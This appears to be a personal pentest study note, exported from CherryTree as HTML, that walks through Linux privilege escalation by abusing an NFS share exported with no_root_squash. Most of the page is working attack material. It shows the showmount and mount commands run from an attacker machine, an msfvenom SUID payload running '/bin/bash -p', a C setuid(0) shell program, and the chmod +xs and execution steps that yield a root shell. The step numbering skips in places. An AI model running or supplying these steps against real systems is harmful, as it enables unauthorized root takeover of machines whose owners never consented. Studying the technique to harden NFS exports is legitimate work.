<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Exploit of NFS root squashing</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Exploit of NFS root squashing</h1><br/><br /><strong><h3>Privilege Escalation</h3></strong><br />0. Use Linux Smart Enumeration Tool<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ .<span style="color:#ff9d00;font-weight:700">/</span>lse.sh -l 2 -i <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">more</span></pre></div><br />    To search in the result you can type &quot;/NFS&quot;<br />    <a href=""><img src="images/1316-1.png" alt="images/1316-1.png" /></a><br />1. Manually: Check the contents of /etc/exports for shares with the <strong>no_root_squash</strong> option:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>exports</pre></div><br />    <a href=""><img src="images/1316-2.png" alt="images/1316-2.png" /></a><br />     <span style="color:#ff8700;">no_root_squash</span> → option means that we can write file to it as the root user over NFS (from another machine). We can mount this folder!<br />4. From the Attacker machine confirm that the NFS share is available for remote mounting:<br />    <div class="codebox"><pre>attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># showmount -e &lt;targetIp&gt;</pre></div><br />    <a href=""><img src="images/1316-3.png" alt="images/1316-3.png" /></a><br />    yes! confirmed<br />5. Create a mount point on your local machine and mount the /tmp NFS share:<br />    <div class="codebox"><pre>attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">mkdir</span> <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>nfs<br />attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">mount</span> -t nfs -o rw,vers=2,nolock 192.168.1.25<span style="color:#ff9d00;font-weight:700">:</span>[remoteDirectory] [localDirectory]     <span style="color:#0088ff;font-weight:400">#now attacker and target are sharing the folder</span></pre></div><br />    mount options:<br />   ◇ -o, --options &lt;list&gt; → comma-separated list of mount options<br />      ▪ -w, --rw, --read-write → mount the filesystem read-write (default)<br />      ▪ vers=&lt;number&gt; → select the nfs version, we should specify to use version 2 because if it doesn&#39;t have any authentication or authorization.<br />      ▪ nolock → disables file locking. This setting is occasionally required when connecting to older NFS servers.<br />   ◇ -t, --types &lt;list&gt; → limit the set of filesystem types<br />        <a href=""><img src="images/1316-4.png" alt="images/1316-4.png" /></a><br />6. check if the mount command is been successfull<br />    <div class="codebox"><pre>attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">mount</span></pre></div><br />    <a href=""><img src="images/1316-5.png" alt="images/1316-5.png" /></a><br />7. Using your local Attacker machine, generate a payload and save it to the mounted share:<br />    <div class="codebox"><pre>attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># msfvenom -p linux<span style="color:#ff9d00;font-weight:700">/</span>x86<span style="color:#ff9d00;font-weight:700">/</span>exec CMD=<span style="color:#3ad900;font-weight:400">&quot;/bin/bash -p&quot;</span> -f elf -o <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>nfs<span style="color:#ff9d00;font-weight:700">/</span>shell.elf<br />attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">ls</span></pre></div><br />    <a href=""><img src="images/1316-6.png" alt="images/1316-6.png" /></a><br />    <a href=""><img src="images/1316-7.png" alt="images/1316-7.png" /></a>    <br />8. Alternatively to poit 7, we can create a payload like this<br />	create a payload, compile it, and save it to the mounted share:<br />	<div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>nfs<br />nano shell.c<br /><span style="color:#ff9d00;font-weight:700">gcc</span> shell.c -o shell</pre></div><br />	shell.c<br />	<div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#include &lt;stdio.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">#include &lt;sys/types.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">#include &lt;unistd.h&gt;</span><br />int main<span style="color:#ff9d00;font-weight:700">(</span>void<span style="color:#ff9d00;font-weight:700">)</span><br /><span style="color:#ff9d00;font-weight:700">{</span><br />  setuid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span> setgid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span> system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;/bin/bash&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#ff9d00;font-weight:700">}</span></pre></div><br />10. Make sure the file has the SUID bit set, and is executable by everyone:<br />	from the attacker machine (since from the target we do nt have the privileges to do it)<br />    <div class="codebox"><pre>attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>nfs<br />attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">chmod</span> +xs <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>nfs<span style="color:#ff9d00;font-weight:700">/</span>shell.elf</pre></div><br />    As we can see the file shell.elf is:<br />   ◇  owned by root<br />   ◇  it is executable by all users<br />   ◇  has the SUID bit set<br />11. On the target machine, execute the file to get a root shell:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>shell.elf</pre></div><br />    <a href=""><img src="images/1316-8.png" alt="images/1316-8.png" /></a></div>
</body>
</html>
